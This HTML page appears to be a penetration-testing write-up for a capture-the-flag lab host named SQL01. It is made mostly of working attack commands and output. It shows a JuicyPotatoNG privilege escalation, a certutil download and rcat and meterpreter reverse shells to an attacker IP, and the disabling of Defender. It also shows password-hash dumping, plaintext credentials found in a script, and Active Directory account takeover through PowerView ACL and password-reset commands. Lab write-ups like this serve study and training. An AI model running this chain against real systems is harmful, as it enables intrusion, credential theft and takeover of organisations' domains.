<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>SQL01 - 172.16.1.15</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>SQL01 - 172.16.1.15</h1><br/><p><a href="Offshore--SQL01_-_172.16.1.15_14.html#OFS-Flag10">Flag 10</a></p><p><a href="Offshore--SQL01_-_172.16.1.15_14.html#OFS-Flag11">Flag 11</a></p><p><a href="Offshore--SQL01_-_172.16.1.15_14.html#OFS-Flag12">Flag 12</a></p><p><a href="Offshore--SQL01_-_172.16.1.15_14.html#OFS-PeterGibbonsCreds">Credentials for pgibbons</a></p><p><a href="Offshore--SQL01_-_172.16.1.15_14.html#OFS-cyber_admcreds">Credentials for cyber_adm for WEB-WIN01</a></p><p></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; whoami /priv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami /priv</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PRIVILEGES INFORMATION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">----------------------</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Privilege Name                Description                               State   </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">============================= ========================================= ========</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeImpersonatePrivilege        Impersonate a client after authentication Enabled </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeCreateGlobalPrivilege       Create global objects                     Enabled </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled</span></code></p><p></p><p>There is SeImpersonatePrivilege so we can use JuciyPotatoNG to do another RCAT to privesc.</p><p></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; certutil -urlcache -split -f http://10.10.16.156/JuicyPotatoNG.exe c:\temp\jp.exe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">certutil -urlcache -split -f http://10.10.16.156/JuicyPotatoNG.exe c:\temp\jp.exe</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">****  Online  ****</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  000000  ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">  025800</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">CertUtil: -URLCache command completed successfully.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; dir c:\temp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">dir c:\temp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    Directory: C:\temp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Mode                LastWriteTime         Length Name                                                                  </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">----                -------------         ------ ----                                                                  </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">-a----         5/1/2023   6:41 PM         153600 jp.exe                                                                </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">-a----         5/1/2023   6:35 PM        2625155 rcat.exe</span></code></p><p></p><p>Use JP to launch RCAT as privileged</p><p></p><p><code><span style="background-color:#000000;">PS C:\Windows\system32&gt; c:\temp\jp.exe -t * -p &quot;c:\windows\system32\cmd.exe&quot; -a &quot;/c C:\temp\rcat.exe connect 10.10.16.156 5555&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">c:\temp\jp.exe -t * -p &quot;c:\windows\system32\cmd.exe&quot; -a &quot;/c C:\temp\rcat.exe connect 10.10.16.156 5555&quot;</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ ./rcat listen 10.10.16.156 5555        </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Listening on 10.10.16.156:5555</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[+] Connection from 10.10.110.3:50308</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Windows PowerShell </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Copyright (C) 2016 Microsoft Corporation. All rights reserved.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PS C:\&gt; whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">nt authority\system</span></code></p><p></p><p>Turn off Defender so we can upload a meterpreter rev shell</p><p></p><p><code><span style="background-color:#000000;">PS C:\&gt; Set-MpPreference -DisableRealtimeMonitoring $true</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Set-MpPreference -DisableRealtimeMonitoring $true</span></code></p><p></p><p><code><span style="background-color:#000000;">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.156 LPORT=5556 -f exe &gt; revshell.exe</span></code></p><p></p><p><code><span style="background-color:#000000;">└─$ msfconsole -q                                                                                             </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 &gt; use multi/handler</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Using configured payload generic/shell_reverse_tcp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">payload =&gt; windows/x64/meterpreter/reverse_tcp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; set LHOST 10.10.16.156</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LHOST =&gt; 10.10.16.156</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; set LPORT 5556</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">LPORT =&gt; 5556</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">msf6 exploit(multi/handler) &gt; run</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Started reverse TCP handler on 10.10.16.156:5556 </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Sending stage (200774 bytes) to 10.10.110.3</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[*] Meterpreter session 1 opened (10.10.16.156:5556 -&gt; 10.10.110.3:25403) at 2023-05-01 18:51:33 -0400</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">meterpreter &gt; getuid</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Server username: NT AUTHORITY\SYSTEM</span></code></p><p></p><p>Now we can dump creds</p><p></p><p><code><span style="background-color:#000000;">meterpreter &gt; hashdump</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">justalocaladmin:1002:aad3b435b51404eeaad3b435b51404ee:e56836b7e6c6a3bf2aece7a8dc2c1fb7:::</span></code></p><p></p><p>Snag the flags</p><p><code><span style="background-color:#000000;">C:\Users\Administrator\Desktop&gt;type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag10"></a>OFFSHORE{hmm_p0tato3s}</p><p></p><p><code><span style="background-color:#000000;">C:\Users\MSSQL$SQLEXPRESS\Desktop&gt;type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">type flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag11"></a>OFFSHORE{cm0n!_an0th3r_sqli!?}</p><p></p><p>Look for any other files of interest in the profiles under C:\users\ with Powershell script that looks for .bat and .ps1 files</p><p></p><p><code><span style="background-color:#000000;">$totalFiles = (Get-ChildItem -Path &quot;C:\users\&quot; -Recurse -Force -ErrorAction SilentlyContinue -File -Include *.ps1, *.bat).Count</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$processedFiles = 0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Get-ChildItem -Path &quot;C:\users\&quot; -Recurse -Force -ErrorAction SilentlyContinue -File -Include *.ps1, *.bat | ForEach-Object {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    $filePath = $_.FullName</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    if ($_ -match &#39;\.(ps1|bat)$&#39;) {</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">        Write-Host $filePath</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    }</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    $processedFiles++</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    $percentComplete = [Math]::Round(($processedFiles / $totalFiles) * 100)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    Write-Progress -Activity &quot;Searching files...&quot; -PercentComplete $percentComplete -Status &quot;$processedFiles/$totalFiles files searched&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">}</span></code></p><p></p><p></p><p><code><span style="background-color:#000000;">PS C:\temp&gt; .\search.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">C:\users\All Users\Microsoft\AppV\Setup\OfficeIntegrator.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">C:\users\Public\Libraries\share.bat</span></code></p><p></p><p>Something interesting in share.bat</p><p><code><span style="background-color:#000000;">PS C:\temp&gt; type c:\users\public\libraries\share.bat</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">@echo off</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">net use Z: \\fs01\users\bill\documents /user:CORP\bill &quot;I like to map Shares!&quot;</span></code></p><p></p><p>If we open this file and mount the directory, there is a flag.txt</p><p><a name="OFS-Flag12"></a><code><span style="background-color:#000000;">OFFSHORE{sl0ppy_scr1pting_hurt$}</span></code></p><p></p><p>There is also a backup script so let&#39;s check that</p><p></p><p><img src="images/14-1.png" alt="images/14-1.png" /></p><p></p><p><a name="OFS-PeterGibbonsCreds"></a>More network creds - pgibbons : “I l0ve going Fishing!”</p><p></p><p>Let&#39;s check the Bloodhound dump of corp.local we got while on WSADM, see if we can use these credentials.</p><p></p><p><img src="images/14-2.png" alt="images/14-2.png" /></p><p></p><p>From what it looks like, pgibbons can make himself the owner of salvador and reset his password to take over that account.</p><p></p><p>To run these commands, you need to be logged in as a domain user so use RDP to 172.16.1.36 with ned.flanders_adm / Lefthandedyeah!</p><p></p><p><code><span style="background-color:#000000;">. .\..\..\temp\PowerView.ps1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$pass = convertto-securestring &quot;I l0ve going Fishing!&quot; -asplaintext -force</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$cred = new-object system.management.automation.pscredential(&quot;CORP\pgibbons&quot;, $pass)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">set-domainobjectowner -identity salvador -owneridentity pgibbons -credential $cred</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">add-domainobjectacl -targetidentity salvador -principalidentity pgibbons -credential $cred</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">$userpassword = convertto-securestring &#39;password123!&#39; -asplaintext -force</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">set-domainuserpassword -identity salvador -accountpassword $UserPassword -credential $cred -verbose</span></code></p><p></p><p><img src="images/14-3.png" alt="images/14-3.png" /></p><p></p><p>Now with salvador&#39;s new password, we can self-add salvador to Security Engineers.</p><p></p><p><code><span style="background-color:#000000;">$cred = new-object system.management.automation.pscredential(&quot;CORP\salvador&quot;, $UserPassword)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">add-domaingroupmember -identity &#39;Security Engineers&#39; -members salvador -credential $cred</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">get-domaingroupmember -identity &#39;Security Engineers&#39;</span></code></p><p></p><p><img src="images/14-4.png" alt="images/14-4.png" /></p><p></p><p>Members of Security Engineers have AllExtendedRights over cyber_adm so we can reset that account password too</p><p></p><p><code><span style="background-color:#000000;">$userpassword = convertto-securestring &#39;password123!&#39; -asplaintext -force</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">set-domainuserpassword -identity cyber_adm -accountpassword $UserPassword -credential $cred -verbose</span></code></p><p></p><p><img src="images/14-5.png" alt="images/14-5.png" /></p><p></p><p><a name="OFS-cyber_admcreds"></a>If we spray with cyber_adm and the new password, we can see it&#39;s an admin on WEB-WIN01</p><p></p><p><img src="images/14-6.png" alt="images/14-6.png" /></p><p></p><p></p><p></p><p></p></div>
</body>
</html>
